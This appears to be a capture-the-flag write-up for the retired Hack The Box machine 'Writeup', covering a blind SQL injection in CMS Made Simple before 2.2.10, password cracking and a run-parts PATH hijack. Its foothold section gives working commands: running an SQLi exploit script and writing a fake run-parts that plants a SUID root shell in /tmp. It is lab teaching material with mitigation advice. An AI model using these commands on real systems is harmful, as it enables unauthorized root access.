---
machine: Writeup
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, web, cms-made-simple, sqli, path-hijack, run-parts, privesc]
---

# Writeup — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The site uses CMS Made Simple before 2.2.10, vulnerable to unauthenticated blind SQLi. Exploitation recovers `jkr`'s salt and hash, which cracks and allows SSH. `jkr` is in the `staff` group, which can write to `/usr/local/bin`; on login, root runs `run-parts` with that directory first in PATH, so a malicious `run-parts` executes as root.

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` OpenSSH 7.4 and `80` Apache 2.4.25 on Debian 9.
- The landing page is a corporate blog generated with CMS Made Simple.
- `robots.txt` and `/writeup/` appear during enumeration.

## Enumeration

Confirm the generator and version in the HTML. CMS Made Simple < 2.2.10 has a time-based blind SQLi; use a public exploit with `--crack` to extract `jkr`'s salt, hash and password.

## Foothold

`jkr`'s password works over SSH. The account is in the `staff` group; `id` and `ls -ld /usr/local/bin` confirm the group can write there.

```bash
# CMS Made Simple SQLi
python cmsms_sqli.py -u http://<IP>/writeup --crack --wordlist rockyou.txt
# PATH hijack
printf '#!/bin/bash\ncp /bin/bash /tmp/root; chmod 6777 /tmp/root\n' > /usr/local/bin/run-parts
chmod +x /usr/local/bin/run-parts
ssh jkr@<IP>  # triggers run-parts as root
/tmp/root -p```

## Lateral movement

There is no extra pivot; escalation depends on a root process that runs on every login.

## Privilege escalation

`pspy` shows that on SSH login root runs `/usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:... run-parts --lsbsysinit /etc/update-motd.d`. Because `/usr/local/bin` precedes `/usr/bin` and is writable by `staff`, create a `run-parts` that copies bash and sets SUID. Log in again over SSH and it runs as root.

## Evidence

- CMS Made Simple < 2.2.10 and blind SQLi.
- `jkr` salt, hash and password.
- `staff` group with write access to `/usr/local/bin`.
- `run-parts` in root's PATH and SUID shell.

## Lessons learned

- Old CMS versions have unauthenticated exploitable SQLi.
- A group with write access to root's PATH is direct escalation.
- `run-parts` and MOTD scripts run on every login.
- `pspy` reveals root processes absent from `cron`.

## Mitigation and detection

- Update CMS Made Simple and parameterize queries.
- Remove `staff` write access to `/usr/local/bin`.
- Use absolute paths in login scripts.
- Audit PATH and system directory permissions.

## References

- [0xdf — Writeup](https://0xdf.gitlab.io/2019/10/12/htb-writeup.html)
- [IppSec — Writeup](https://www.youtube.com/watch?v=GKq4cwBfH24)
- [Hack The Box — Writeup](https://app.hackthebox.com/machines/writeup)
